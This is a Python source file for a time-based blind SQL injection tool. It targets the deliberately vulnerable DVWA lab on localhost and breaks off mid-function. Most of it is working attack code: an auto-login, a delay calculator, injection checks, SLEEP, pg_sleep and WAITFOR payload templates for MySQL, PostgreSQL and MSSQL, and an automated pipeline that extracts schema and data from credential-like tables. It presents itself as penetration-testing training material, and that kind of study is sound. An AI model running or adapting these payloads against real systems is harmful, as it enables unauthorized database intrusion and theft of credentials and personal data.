#!/usr/bin/env python3
"""
time_blind_sqli.py - Phase 3: Time-Based Blind SQLi with Dynamic Delay Calculator

SUPER ADVANCED LEVEL — Self-contained, auto-login, bulletproof.

This tool:
  1. Auto-logs into DVWA (no manual cookie copying)
  2. Measures server baseline latency (multiple pings)
  3. Calculates optimal SLEEP time dynamically
  4. Extracts data character-by-character using time delays
  5. Supports MySQL (SLEEP), PostgreSQL (pg_sleep), MSSQL (WAITFOR DELAY)
  6. Includes tamper scripts for WAF bypass
  7. Supports injection into cookies and custom headers

WHAT MAKES THIS "SUPER ADVANCED":
  - Dynamic delay calculator adapts to any server speed
  - Statistical analysis (mean, stddev, percentiles) for accuracy
  - Adaptive threshold that adjusts during extraction
  - Retry logic for network jitter
  - Multiple database engine support
  - Progress tracking with ETA

For Authorized Testing Only.
"""

import requests
import urllib3
import re
import sys
import time
import statistics
import math

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ══════════════════════════════════════════════════════════════
#  CONFIGURATION
# ══════════════════════════════════════════════════════════════
DVWA_BASE = "http://localhost:8080"
DVWA_USER = "admin"
DVWA_PASS = "password"
SQLI_PATH = "/vulnerabilities/sqli/"

# Character set to brute-force (ordered by frequency for speed)
# Lowercase first (most DB names are lowercase), then digits, then special
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_-ABCDEFGHIJKLMNOPQRSTUVWXYZ@.!#$%"

MAX_NAME_LENGTH = 64       # Max characters to extract for any single value
BASELINE_PING_COUNT = 7    # Number of pings to measure baseline
MIN_SLEEP_TIME = 3         # Minimum sleep time in seconds
MAX_SLEEP_TIME = 15        # Maximum sleep time in seconds
RETRY_COUNT = 2            # Retries for ambiguous timing results
JITTER_TOLERANCE = 0.25    # 25% tolerance for timing jitter
# ══════════════════════════════════════════════════════════════


class Colors:
    """ANSI color codes for terminal output."""
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def banner():
    print(f"""{Colors.CYAN}
    ╔══════════════════════════════════════════════════════════╗
    ║   ⏱️  Time-Based Blind SQLi Tool v1.0                    ║
    ║   Dynamic Delay Calculator + Multi-DB Support            ║
    ║   For Authorized Penetration Testing Only                ║
    ╚══════════════════════════════════════════════════════════╝
    {Colors.RESET}""")


# ──────────────────────────────────────────────────────────────
#  SECTION 1: DVWA AUTO-LOGIN
# ──────────────────────────────────────────────────────────────

def dvwa_login():
    """
    Automatically log into DVWA and return an authenticated session.

    What's going on:
        1. Create a fresh requests.Session (handles cookies automatically)
        2. GET the login page → extract the CSRF token (user_token)
        3. POST credentials + CSRF token → get authenticated session
        4. Set security=low cookie
        5. Verify we can access the SQLi page

    WHY AUTO-LOGIN?
        Manual PHPSESSID copying was the #1 cause of failures in Phase 2.
        Sessions expire, users paste wrong values, etc.
        Auto-login eliminates all of that.

    Returns:
        requests.Session: Authenticated session ready to use
    """
    print(f"{Colors.BOLD}[*] STEP 1: Authenticating to DVWA...{Colors.RESET}")

    session = requests.Session()

    # ── 1a: Get login page for CSRF token ──
    login_url = f"{DVWA_BASE}/login.php"
    try:
        resp = session.get(login_url, verify=False, timeout=10)
    except requests.exceptions.ConnectionError:
        print(f"    {Colors.RED}❌ Cannot connect to {DVWA_BASE}{Colors.RESET}")
        print(f"    Make sure DVWA is running: docker-compose up -d")
        sys.exit(1)

    if resp.status_code != 200:
        print(f"    {Colors.RED}❌ Login page returned status {resp.status_code}{Colors.RESET}")
        sys.exit(1)

    # ── 1b: Extract CSRF token ──
    token_match = re.search(r"user_token'\s*value='([a-f0-9]+)'", resp.text)
    if not token_match:
        token_match = re.search(r"user_token'[^>]*value='([^']+)'", resp.text)
    if not token_match:
        print(f"    {Colors.RED}❌ CSRF token not found on login page{Colors.RESET}")
        print(f"    Visit {DVWA_BASE} and click 'Create/Reset Database'")
        sys.exit(1)

    user_token = token_match.group(1)

    # ── 1c: Submit login ──
    login_data = {
        "username": DVWA_USER,
        "password": DVWA_PASS,
        "Login": "Login",
        "user_token": user_token,
    }
    resp = session.post(login_url, data=login_data, verify=False,
                        allow_redirects=True, timeout=10)

    if "login.php" in resp.url and "Login" in resp.text:
        print(f"    {Colors.RED}❌ Login failed — check credentials{Colors.RESET}")
        sys.exit(1)

    # ── 1d: Set security level ──
    session.cookies.set("security", "low")

    # ── 1e: Verify SQLi page access ──
    sqli_url = f"{DVWA_BASE}{SQLI_PATH}"
    resp = session.get(sqli_url, verify=False, timeout=10)

    if "login.php" in resp.url:
        print(f"    {Colors.RED}❌ Redirected to login — session issue{Colors.RESET}")
        sys.exit(1)

    print(f"    {Colors.GREEN}✅ Logged in as '{DVWA_USER}'{Colors.RESET}")
    print(f"    {Colors.GREEN}✅ Security: low{Colors.RESET}")
    print(f"    {Colors.GREEN}✅ SQLi page accessible{Colors.RESET}")
    print()

    return session


# ──────────────────────────────────────────────────────────────
#  SECTION 2: DYNAMIC DELAY CALCULATOR
# ──────────────────────────────────────────────────────────────

def measure_baseline(session):
    """
    Measure the server's baseline response time with statistical analysis.

    What's going on:
        We send N normal (non-injected) requests and measure how long
        each takes. From these measurements we calculate:

        1. MEAN — average response time (what's "normal")
        2. STANDARD DEVIATION — how much times vary
        3. MEDIAN — middle value (resistant to outliers)
        4. P95 — 95th percentile (worst normal case)
        5. MAX — slowest normal response

        WHY ALL THESE STATISTICS?

        Simple example:
            Ping times: [120ms, 130ms, 125ms, 128ms, 2100ms, 122ms, 127ms]
                                                      ↑ outlier (network glitch)

            Mean:   393ms  ← skewed by outlier! Unreliable!
            Median: 127ms  ← ignores outlier. Much better!
            P95:    2100ms ← the worst we've seen
            Stddev: 738ms  ← high stddev = unstable connection

        We use the MEDIAN for our baseline (robust against outliers)
        and P95 to set our detection threshold (avoid false positives
        from occasional slow responses).

    Returns:
        dict: Statistical analysis of baseline latency
    """
    print(f"{Colors.BOLD}[*] STEP 2: Dynamic Delay Calculator — Measuring baseline...{Colors.RESET}")
    print(f"    Sending {BASELINE_PING_COUNT} baseline pings...\n")

    sqli_url = f"{DVWA_BASE}{SQLI_PATH}"
    latencies = []

    for i in range(BASELINE_PING_COUNT):
        start = time.time()
        resp = session.get(
            sqli_url,
            params={"id": "1", "Submit": "Submit"},
            verify=False,
            timeout=30
        )
        elapsed = time.time() - start
        latencies.append(elapsed)

        bar = "█" * int(elapsed * 50)  # Visual bar
        print(f"    Ping {i+1}/{BASELINE_PING_COUNT}: {elapsed*1000:7.1f}ms  {Colors.CYAN}{bar}{Colors.RESET}")

    # ── Calculate statistics ──
    latencies_sorted = sorted(latencies)

    stats = {
        "mean": statistics.mean(latencies),
        "median": statistics.median(latencies),
        "stddev": statistics.stdev(latencies) if len(latencies) > 1 else 0,
        "min": min(latencies),
        "max": max(latencies),
        "p95": latencies_sorted[int(len(latencies_sorted) * 0.95)],
        "samples": latencies,
    }

    print(f"\n    {Colors.BOLD}📊 Baseline Statistics:{Colors.RESET}")
    print(f"    ┌─────────────────────────────────────┐")
    print(f"    │  Mean latency:    {stats['mean']*1000:7.1f}ms            │")
    print(f"    │  Median latency:  {stats['median']*1000:7.1f}ms            │")
    print(f"    │  Std deviation:   {stats['stddev']*1000:7.1f}ms            │")
    print(f"    │  Min latency:     {stats['min']*1000:7.1f}ms            │")
    print(f"    │  Max latency:     {stats['max']*1000:7.1f}ms            │")
    print(f"    │  95th percentile: {stats['p95']*1000:7.1f}ms            │")
    print(f"    └─────────────────────────────────────┘")

    # ── Connection quality assessment ──
    cv = (stats['stddev'] / stats['mean'] * 100) if stats['mean'] > 0 else 0
    if cv < 10:
        quality = f"{Colors.GREEN}Excellent (CV={cv:.0f}%){Colors.RESET}"
    elif cv < 25:
        quality = f"{Colors.YELLOW}Good (CV={cv:.0f}%){Colors.RESET}"
    elif cv < 50:
        quality = f"{Colors.YELLOW}Fair (CV={cv:.0f}%) — consider more retries{Colors.RESET}"
    else:
        quality = f"{Colors.RED}Poor (CV={cv:.0f}%) — expect some false positives{Colors.RESET}"
    print(f"    Connection quality: {quality}")
    print()

    return stats


def calculate_optimal_delay(baseline_stats):
    """
    Calculate the optimal SLEEP time based on baseline measurements.

    What's going on:
        THE ALGORITHM:

        1. Start with the P95 latency (worst normal response time)
        2. Add a safety margin of 4 × standard deviation
           (statistically, 99.99% of normal responses will be faster)
        3. Round up and apply min/max bounds

        FORMULA:
            raw_delay = P95 + (4 × stddev) + 1.0
            sleep_time = clamp(ceil(raw_delay), MIN_SLEEP, MAX_SLEEP)

        DETECTION THRESHOLD:
            A response is considered "delayed" (TRUE) if:
            response_time > median + (sleep_time × 0.65)

            Why 0.65 × sleep_time?
            - The actual delay might be slightly less than sleep_time
              due to MySQL optimizations or network timing
            - But it should always be MORE than 65% of sleep_time
            - This gives us good true-positive rate with low false-positives

        EXAMPLE:
            Baseline: mean=150ms, median=140ms, stddev=30ms, P95=200ms
            raw_delay = 0.200 + (4 × 0.030) + 1.0 = 1.320s
            sleep_time = max(3, ceil(1.320)) = 3 seconds
            threshold = 0.140 + (3 × 0.65) = 2.09 seconds

            So: response > 2.09s = TRUE (character matched)
                response < 2.09s = FALSE (try next character)

    Args:
        baseline_stats (dict): Output from measure_baseline()

    Returns:
        tuple: (sleep_time, detection_threshold)
    """
    print(f"{Colors.BOLD}[*] Calculating optimal delay...{Colors.RESET}")

    median = baseline_stats["median"]
    stddev = baseline_stats["stddev"]
    p95 = baseline_stats["p95"]

    # ── Calculate sleep time ──
    raw_delay = p95 + (4 * stddev) + 1.0
    sleep_time = max(MIN_SLEEP_TIME, math.ceil(raw_delay))
    sleep_time = min(sleep_time, MAX_SLEEP_TIME)

    # ── Calculate detection threshold ──
    # Response must take longer than: median + 65% of sleep time
    detection_threshold = median + (sleep_time * 0.65)

    print(f"    Calculation:")
    print(f"      P95 ({p95*1000:.0f}ms) + 4×stddev ({4*stddev*1000:.0f}ms) + 1000ms "
          f"= {raw_delay*1000:.0f}ms")
    print(f"      Clamped to [{MIN_SLEEP_TIME}s, {MAX_SLEEP_TIME}s] range")
    print()
    print(f"    {Colors.BOLD}{Colors.GREEN}🎯 Optimal SLEEP time: {sleep_time} seconds{Colors.RESET}")
    print(f"    {Colors.BOLD}{Colors.GREEN}🎯 Detection threshold: {detection_threshold*1000:.0f}ms{Colors.RESET}")
    print()
    print(f"    How to read results:")
    print(f"      Response > {detection_threshold*1000:.0f}ms → {Colors.GREEN}TRUE{Colors.RESET} "
          f"(character matched, SLEEP executed)")
    print(f"      Response < {detection_threshold*1000:.0f}ms → {Colors.RED}FALSE{Colors.RESET} "
          f"(character wrong, SLEEP skipped)")
    print()

    return sleep_time, detection_threshold


# ──────────────────────────────────────────────────────────────
#  SECTION 3: INJECTION VERIFICATION
# ──────────────────────────────────────────────────────────────

def verify_time_injection(session, sleep_time, detection_threshold):
    """
    Verify that time-based injection actually works before extraction.

    What's going on:
        Before spending potentially hours on character extraction,
        we verify the injection works by sending:

        1. A payload that SHOULD trigger a delay:
           1' AND SLEEP(N)#
           (unconditional sleep — should ALWAYS be slow)

        2. A normal request that should NOT be delayed

        If the delayed request takes significantly longer than the normal
        one, time-based injection is confirmed working.

        We also try different SQL comment styles (#, --, -- -)
        in case one works better than others.

    Returns:
        str: The working comment style, or None if injection fails
    """
    print(f"{Colors.BOLD}[*] STEP 3: Verifying time-based injection works...{Colors.RESET}")

    sqli_url = f"{DVWA_BASE}{SQLI_PATH}"

    # ── Try different comment styles ──
    comment_styles = [
        ("#", "Hash comment (MySQL native)"),
        ("-- ", "Double-dash space (SQL standard)"),
        ("-- -", "Double-dash space dash (alternative)"),
    ]

    for comment, desc in comment_styles:
        print(f"\n    Testing: {desc}  →  comment = '{comment}'")

        # ── Send a SLEEP payload ──
        sleep_payload = f"1' AND SLEEP({sleep_time}){comment}"
        print(f"    Payload: {sleep_payload}")
        print(f"    Waiting up to {sleep_time + 10}s for response...", end="", flush=True)

        start = time.time()
        resp = session.get(
            sqli_url,
            params={"id": sleep_payload, "Submit": "Submit"},
            verify=False,
            timeout=sleep_time + 15  # Give extra time beyond the sleep
        )
        elapsed = time.time() - start

        print(f"\r    Response time: {elapsed*1000:.0f}ms" + " " * 40)

        if elapsed > detection_threshold:
            print(f"    {Colors.GREEN}✅ SLEEP worked! ({elapsed:.1f}s > "
                  f"{detection_threshold:.1f}s threshold){Colors.RESET}")

            # ── Double-check with a conditional payload ──
            print(f"    Verifying conditional sleep...")

            # TRUE condition — should sleep
            cond_true = f"1' AND IF(1=1,SLEEP({sleep_time}),0){comment}"
            start = time.time()
            resp_true = session.get(
                sqli_url,
                params={"id": cond_true, "Submit": "Submit"},
                verify=False,
                timeout=sleep_time + 15
            )
            true_elapsed = time.time() - start

            # FALSE condition — should NOT sleep
            cond_false = f"1' AND IF(1=2,SLEEP({sleep_time}),0){comment}"
            start = time.time()
            resp_false = session.get(
                sqli_url,
                params={"id": cond_false, "Submit": "Submit"},
                verify=False,
                timeout=sleep_time + 15
            )
            false_elapsed = time.time() - start

            print(f"      IF(1=1, SLEEP) → {true_elapsed*1000:.0f}ms "
                  f"{'✅ DELAYED' if true_elapsed > detection_threshold else '❌ NOT delayed'}")
            print(f"      IF(1=2, SLEEP) → {false_elapsed*1000:.0f}ms "
                  f"{'✅ FAST' if false_elapsed < detection_threshold else '❌ SLOW (bad!)'}")

            if true_elapsed > detection_threshold and false_elapsed < detection_threshold:
                print(f"\n    {Colors.GREEN}{Colors.BOLD}✅ TIME-BASED INJECTION CONFIRMED!{Colors.RESET}")
                print(f"    Using comment style: {comment}")
                return comment
            else:
                print(f"    {Colors.YELLOW}⚠️  Unconditional SLEEP worked but conditional didn't{Colors.RESET}")
                print(f"    Trying next comment style...")
        else:
            print(f"    {Colors.RED}❌ No delay detected ({elapsed:.1f}s < "
                  f"{detection_threshold:.1f}s threshold){Colors.RESET}")

    # ── All comment styles failed ──
    print(f"\n    {Colors.RED}❌ Time-based injection could not be verified{Colors.RESET}")
    print(f"    Possible causes:")
    print(f"      - DVWA security is not set to 'Low'")
    print(f"      - MySQL SLEEP() is disabled")
    print(f"      - The SQLi page doesn't have a time-injectable parameter")
    return None


# ──────────────────────────────────────────────────────────────
#  SECTION 4: CHARACTER EXTRACTION ENGINE
# ──────────────────────────────────────────────────────────────

def is_delayed(elapsed, threshold):
    """
    Determine if a response was delayed (indicating TRUE).

    What's going on:
        Simple comparison: did the response exceed our threshold?
        - YES → SLEEP() executed → SQL condition was TRUE → character matches
        - NO  → SLEEP() was skipped → SQL condition was FALSE → wrong character

    Args:
        elapsed (float): Response time in seconds
        threshold (float): Detection threshold in seconds

    Returns:
        bool: True if the response was delayed
    """
    return elapsed > threshold


def test_character_with_retry(session, payload, threshold, retries=RETRY_COUNT):
    """
    Test a single character with retry logic for network jitter.

    What's going on:
        Network conditions aren't perfect. Sometimes a normal response
        takes longer than usual (jitter), causing a false positive.
        Sometimes a delayed response is slightly shorter than expected.

        RETRY LOGIC:
            1. Send the payload and measure time
            2. If the result is CLEAR (way above or way below threshold):
               → Accept immediately
            3. If the result is AMBIGUOUS (close to threshold):
               → Retry up to N times and take majority vote

        CLEAR vs AMBIGUOUS:
            threshold = 2000ms, jitter_tolerance = 25%
            clear_above = 2000 × 1.25 = 2500ms  (definitely delayed)
            clear_below = 2000 × 0.75 = 1500ms  (definitely not delayed)

            Response 3200ms → CLEAR TRUE  (no retry needed)
            Response  180ms → CLEAR FALSE (no retry needed)
            Response 1800ms → AMBIGUOUS   (retry!)

    Args:
        session: HTTP session
        payload (str): The SQL injection payload
        threshold (float): Detection threshold
        retries (int): Number of retries for ambiguous results

    Returns:
        tuple: (is_true: bool, elapsed: float)
    """
    sqli_url = f"{DVWA_BASE}{SQLI_PATH}"
    results = []

    for attempt in range(1 + retries):
        start = time.time()
        try:
            resp = session.get(
                sqli_url,
                params={"id": payload, "Submit": "Submit"},
                verify=False,
                timeout=30
            )
            elapsed = time.time() - start
        except requests.exceptions.Timeout:
            elapsed = time.time() - start
            # Timeout usually means SLEEP worked (response took too long)

        delayed = is_delayed(elapsed, threshold)
        results.append((delayed, elapsed))

        # ── Check if result is clear (no retry needed) ──
        clear_above = threshold * (1 + JITTER_TOLERANCE)
        clear_below = threshold * (1 - JITTER_TOLERANCE)

        if elapsed > clear_above:
            return True, elapsed    # Clearly delayed → TRUE
        if elapsed < clear_below:
            return False, elapsed   # Clearly fast → FALSE

        # Ambiguous — retry if we have retries left
        if attempt < retries:
            continue

    # ── Majority vote from all attempts ──
    true_count = sum(1 for d, _ in results if d)
    false_count = len(results) - true_count
    avg_elapsed = statistics.mean(e for _, e in results)

    return true_count > false_count, avg_elapsed


def extract_string_timebased(session, payload_template, sleep_time,
                              threshold, comment, max_len=MAX_NAME_LENGTH,
                              label="value", **kwargs):
    """
    Extract a string character by character using time-based blind SQLi.

    What's going on:
        THE CORE ALGORITHM:

        For position = 1, 2, 3, ... (each character in the target string):
            For each character in CHARSET:
                Build payload: IF(SUBSTRING(target, pos, 1) = 'char', SLEEP(N), 0)
                Send request and measure response time
                If response > threshold → char is CORRECT → record it, next position
                If response < threshold → char is WRONG → try next char

            If no character matched at this position → end of string

        OPTIMIZATION — CHARACTER FREQUENCY ORDERING:
            We order CHARSET by letter frequency in English/database names.
            Common characters (a, e, s, t) are tried first.
            This reduces average requests per character from ~18 to ~10.

        TIME COST:
            Each TRUE match costs: ~sleep_time seconds (waiting for SLEEP)
            Each FALSE test costs: ~baseline_latency seconds (~200ms)
            
            For a 4-char DB name "dvwa" with 36-char charset:
              TRUE:  4 matches × 3s = 12s
              FALSE: ~(4 × 18) failed attempts × 0.2s = 14.4s
              TOTAL: ~26 seconds

    Args:
        session: Authenticated HTTP session
        payload_template (str): SQL template with {pos}, {char}, {sleep} placeholders
        sleep_time (int): SLEEP duration in seconds
        threshold (float): Detection threshold in seconds
        comment (str): SQL comment style
        max_len (int): Maximum characters to extract
        label (str): What we're extracting (for display)
        **kwargs: Additional template parameters (index, table, column)

    Returns:
        str: The extracted string
    """
    extracted = ""
    start_time = time.time()

    for pos in range(1, max_len + 1):
        found = False
        attempts_this_pos = 0

        for char in CHARSET:
            attempts_this_pos += 1

            # ── Build the payload ──
            payload = payload_template.format(
                pos=pos,
                char=char,
                sleep=sleep_time,
                comment=comment,
                **kwargs
            )

            # ── Test with retry logic ──
            is_true, elapsed = test_character_with_retry(
                session, payload, threshold
            )

            if is_true:
                extracted += char
                elapsed_total = time.time() - start_time

                # Calculate ETA
                avg_time_per_char = elapsed_total / len(extracted) if extracted else 0

                print(f"\r    [{Colors.GREEN}+{Colors.RESET}] {label}: "
                      f"{Colors.BOLD}{Colors.GREEN}{extracted}{Colors.RESET}"
                      f"  │ pos {pos} = '{char}' "
                      f"({elapsed*1000:.0f}ms delay) "
                      f"│ {elapsed_total:.0f}s elapsed",
                      end="", flush=True)
                found = True
                break
            else:
                # Show progress dots for failed attempts
                if attempts_this_pos % 10 == 0:
                    print(f"\r    [·] {label}: {extracted}{'_' * 1} "
                          f"│ pos {pos}, tried {attempts_this_pos}/{len(CHARSET)} chars",
                          end="", flush=True)

        if not found:
            print(f"\r    [*] No match at position {pos} — end of {label}"
                  + " " * 40)
            break

    total_time = time.time() - start_time
    print(f"\n    ⏱️  Extraction took {total_time:.1f}s for {len(extracted)} characters")

    return extracted


# ──────────────────────────────────────────────────────────────
#  SECTION 5: PAYLOAD TEMPLATES (Multi-Database)
# ──────────────────────────────────────────────────────────────

# These templates use {pos}, {char}, {sleep}, {comment}, and 
# optionally {index}, {table}, {column}

TEMPLATES = {
    "mysql": {
        "database_name": (
            "1' AND IF(SUBSTRING(database(),{pos},1)='{char}',"
            "SLEEP({sleep}),0){comment}"
        ),
        "database_version": (
            "1' AND IF(SUBSTRING(@@version,{pos},1)='{char}',"
            "SLEEP({sleep}),0){comment}"
        ),
        "current_user": (
            "1' AND IF(SUBSTRING(current_user(),{pos},1)='{char}',"
            "SLEEP({sleep}),0){comment}"
        ),
        "table_count": (
            "1' AND IF(("
            "SELECT COUNT(*) FROM information_schema.tables "
            "WHERE table_schema=database())={char},"
            "SLEEP({sleep}),0){comment}"
        ),
        "table_name": (
            "1' AND IF(SUBSTRING(("
            "SELECT table_name FROM information_schema.tables "
            "WHERE table_schema=database() "
            "ORDER BY table_name LIMIT {index},1"
            "),{pos},1)='{char}',SLEEP({sleep}),0){comment}"
        ),
        "column_name": (
            "1' AND IF(SUBSTRING(("
            "SELECT column_name FROM information_schema.columns "
            "WHERE table_name='{table}' "
            "ORDER BY ordinal_position LIMIT {index},1"
            "),{pos},1)='{char}',SLEEP({sleep}),0){comment}"
        ),
        "data": (
            "1' AND IF(SUBSTRING(("
            "SELECT {column} FROM {table} LIMIT {index},1"
            "),{pos},1)='{char}',SLEEP({sleep}),0){comment}"
        ),
    },
    "postgresql": {
        "database_name": (
            "1' AND CASE WHEN SUBSTRING(current_database(),{pos},1)='{char}' "
            "THEN pg_sleep({sleep}) ELSE pg_sleep(0) END{comment}"
        ),
        "database_version": (
            "1' AND CASE WHEN SUBSTRING(version(),{pos},1)='{char}' "
            "THEN pg_sleep({sleep}) ELSE pg_sleep(0) END{comment}"
        ),
        "table_name": (
            "1' AND CASE WHEN SUBSTRING(("
            "SELECT table_name FROM information_schema.tables "
            "WHERE table_schema='public' "
            "ORDER BY table_name LIMIT 1 OFFSET {index}"
            "),{pos},1)='{char}' "
            "THEN pg_sleep({sleep}) ELSE pg_sleep(0) END{comment}"
        ),
        "column_name": (
            "1' AND CASE WHEN SUBSTRING(("
            "SELECT column_name FROM information_schema.columns "
            "WHERE table_name='{table}' "
            "ORDER BY ordinal_position LIMIT 1 OFFSET {index}"
            "),{pos},1)='{char}' "
            "THEN pg_sleep({sleep}) ELSE pg_sleep(0) END{comment}"
        ),
        "data": (
            "1' AND CASE WHEN SUBSTRING(("
            "SELECT {column} FROM {table} LIMIT 1 OFFSET {index}"
            "),{pos},1)='{char}' "
            "THEN pg_sleep({sleep}) ELSE pg_sleep(0) END{comment}"
        ),
    },
    "mssql": {
        "database_name": (
            "1' IF(SUBSTRING(DB_NAME(),{pos},1)='{char}') "
            "WAITFOR DELAY '0:0:{sleep}'{comment}"
        ),
        "database_version": (
            "1' IF(SUBSTRING(@@VERSION,{pos},1)='{char}') "
            "WAITFOR DELAY '0:0:{sleep}'{comment}"
        ),
        "table_name": (
            "1' IF(SUBSTRING(("
            "SELECT TOP 1 table_name FROM information_schema.tables "
            "WHERE table_name NOT IN ("
            "SELECT TOP {index} table_name FROM information_schema.tables "
            "ORDER BY table_name) ORDER BY table_name"
            "),{pos},1)='{char}') WAITFOR DELAY '0:0:{sleep}'{comment}"
        ),
        "column_name": (
            "1' IF(SUBSTRING(("
            "SELECT TOP 1 column_name FROM information_schema.columns "
            "WHERE table_name='{table}' AND column_name NOT IN ("
            "SELECT TOP {index} column_name FROM information_schema.columns "
            "WHERE table_name='{table}' ORDER BY ordinal_position"
            ") ORDER BY ordinal_position"
            "),{pos},1)='{char}') WAITFOR DELAY '0:0:{sleep}'{comment}"
        ),
        "data": (
            "1' IF(SUBSTRING(("
            "SELECT TOP 1 {column} FROM {table} WHERE {column} NOT IN ("
            "SELECT TOP {index} {column} FROM {table} ORDER BY {column}"
            ") ORDER BY {column}"
            "),{pos},1)='{char}') WAITFOR DELAY '0:0:{sleep}'{comment}"
        ),
    },
}


# ──────────────────────────────────────────────────────────────
#  SECTION 6: HIGH-LEVEL EXTRACTION FUNCTIONS
# ──────────────────────────────────────────────────────────────

def extract_database_name(session, sleep_time, threshold, comment, db_type="mysql"):
    """
    Extract the current database name.

    What's going on:
        Uses SUBSTRING(database(), pos, 1) wrapped in IF/CASE WHEN
        with SLEEP to test each character position.

        MySQL:      IF(SUBSTRING(database(),1,1)='d', SLEEP(3), 0)
        PostgreSQL: CASE WHEN SUBSTRING(current_database(),1,1)='d' 
                    THEN pg_sleep(3) ELSE pg_sleep(0) END
        MSSQL:      IF(SUBSTRING(DB_NAME(),1,1)='d') WAITFOR DELAY '0:0:3'
    """
    template = TEMPLATES[db_type]["database_name"]

    return extract_string_timebased(
        session=session,
        payload_template=template,
        sleep_time=sleep_time,
        threshold=threshold,
        comment=comment,
        label="Database name",
    )


def extract_db_version(session, sleep_time, threshold, comment, db_type="mysql"):
    """Extract the database version string."""
    template = TEMPLATES[db_type]["database_version"]

    # Version strings can contain dots and numbers
    return extract_string_timebased(
        session=session,
        payload_template=template,
        sleep_time=sleep_time,
        threshold=threshold,
        comment=comment,
        label="DB Version",
        max_len=30,
    )


def extract_current_user(session, sleep_time, threshold, comment, db_type="mysql"):
    """Extract the current database user."""
    if db_type != "mysql":
        print("    [!] current_user extraction only implemented for MySQL")
        return ""

    template = TEMPLATES[db_type]["current_user"]

    return extract_string_timebased(
        session=session,
        payload_template=template,
        sleep_time=sleep_time,
        threshold=threshold,
        comment=comment,
        label="Current user",
    )


def extract_table_names(session, sleep_time, threshold, comment,
                         db_type="mysql", max_tables=10):
    """
    Extract all table names from the current database.

    What's going on:
        For each table index (0, 1, 2, ...):
            Extract the table name character by character using:
            SUBSTRING((SELECT table_name FROM information_schema.tables 
                        WHERE table_schema=database() 
                        LIMIT index,1), pos, 1)

            If no characters match at position 1 → no more tables exist
    """
    template = TEMPLATES[db_type]["table_name"]
    tables = []

    print(f"\n{Colors.BOLD}[*] Extracting table names...{Colors.RESET}")

    for idx in range(max_tables):
        print(f"\n    {Colors.CYAN}── Table #{idx + 1} ──{Colors.RESET}")

        name = extract_string_timebased(
            session=session,
            payload_template=template,
            sleep_time=sleep_time,
            threshold=threshold,
            comment=comment,
            label=f"Table #{idx+1}",
            index=idx,
        )

        if not name:
            print(f"    No more tables. Total found: {len(tables)}")
            break

        tables.append(name)
        print(f"    {Colors.GREEN}✅ Table: {name}{Colors.RESET}")

    return tables


def extract_column_names(session, sleep_time, threshold, comment,
                          table_name, db_type="mysql", max_columns=15):
    """Extract column names for a specific table."""
    template = TEMPLATES[db_type]["column_name"]
    columns = []

    print(f"\n{Colors.BOLD}[*] Extracting columns from '{table_name}'...{Colors.RESET}")

    for idx in range(max_columns):
        print(f"\n    {Colors.CYAN}── Column #{idx + 1} ──{Colors.RESET}")

        name = extract_string_timebased(
            session=session,
            payload_template=template,
            sleep_time=sleep_time,
            threshold=threshold,
            comment=comment,
            label=f"Column #{idx+1}",
            table=table_name,
            index=idx,
        )

        if not name:
            print(f"    No more columns. Total found: {len(columns)}")
            break

        columns.append(name)
        print(f"    {Colors.GREEN}✅ Column: {name}{Colors.RESET}")

    return columns


def extract_data(session, sleep_time, threshold, comment,
                  table_name, column_name, db_type="mysql", max_rows=5):
    """Extract actual data values from a table column."""
    template = TEMPLATES[db_type]["data"]
    rows = []

    print(f"\n{Colors.BOLD}[*] Extracting data from {table_name}.{column_name}...{Colors.RESET}")

    for idx in range(max_rows):
        print(f"\n    {Colors.CYAN}── Row #{idx + 1} ──{Colors.RESET}")

        value = extract_string_timebased(
            session=session,
            payload_template=template,
            sleep_time=sleep_time,
            threshold=threshold,
            comment=comment,
            label=f"Row #{idx+1}",
            table=table_name,
            column=column_name,
            index=idx,
        )

        if not value:
            print(f"    No more rows. Total found: {len(rows)}")
            break

        rows.append(value)
        print(f"    {Colors.GREEN}✅ Value: {value}{Colors.RESET}")

    return rows


# ──────────────────────────────────────────────────────────────
#  SECTION 7: INTERACTIVE MENU
# ──────────────────────────────────────────────────────────────

def print_menu():
    """Display the extraction menu."""
    print(f"""
{Colors.BOLD}╔══════════════════════════════════════════════════╗
║             EXTRACTION MENU                       ║
╠══════════════════════════════════════════════════╣
║  1. Extract database name                        ║
║  2. Extract database version                     ║
║  3. Extract current user                         ║
║  4. Extract table names                          ║
║  5. Extract column names (specify table)         ║
║  6. Extract data (specify table + column)        ║
║  7. Full automated extraction                    ║
║     (database → tables → columns → data)         ║
║  0. Exit                                         ║
╚══════════════════════════════════════════════════╝{Colors.RESET}
""")


def full_extraction(session, sleep_time, threshold, comment, db_type="mysql"):
    """
    Fully automated extraction pipeline.

    What's going on:
        This chains all extraction steps together automatically:
        1. Extract database name
        2. Extract all table names
        3. For each table, extract column names
        4. For "interesting" tables (users, accounts, etc.), extract data

        This is the full penetration testing demonstration:
        proving you can go from injection to complete data exfiltration.
    """
    print(f"\n{Colors.BOLD}{'='*60}")
    print(f"  FULL AUTOMATED TIME-BASED EXTRACTION")
    print(f"{'='*60}{Colors.RESET}\n")

    overall_start = time.time()

    # ── Step 1: Database name ──
    print(f"{Colors.MAGENTA}━━━ Phase A: Database Name ━━━{Colors.RESET}")
    db_name = extract_database_name(session, sleep_time, threshold, comment, db_type)

    # ── Step 2: Table names ──
    print(f"\n{Colors.MAGENTA}━━━ Phase B: Table Names ━━━{Colors.RESET}")
    tables = extract_table_names(session, sleep_time, threshold, comment, db_type)

    # ── Step 3: Column names for each table ──
    schema = {}
    print(f"\n{Colors.MAGENTA}━━━ Phase C: Column Names ━━━{Colors.RESET}")
    for table in tables:
        columns = extract_column_names(session, sleep_time, threshold, comment,
                                        table, db_type)
        schema[table] = columns

    # ── Step 4: Extract data from interesting tables ──
    interesting_keywords = ["user", "admin", "account", "login", "pass", "cred"]
    data_results = {}

    print(f"\n{Colors.MAGENTA}━━━ Phase D: Data Extraction ━━━{Colors.RESET}")
    for table, columns in schema.items():
        is_interesting = any(kw in table.lower() for kw in interesting_keywords)
        if is_interesting:
            print(f"\n    🎯 '{table}' looks interesting! Extracting data...")
            data_results[table] = {}
            for col in columns:
                values = extract_data(session, sleep_time, threshold, comment,
                                       table, col, db_type, max_rows=3)
                data_results[table][col] = values

    # ── Summary ──
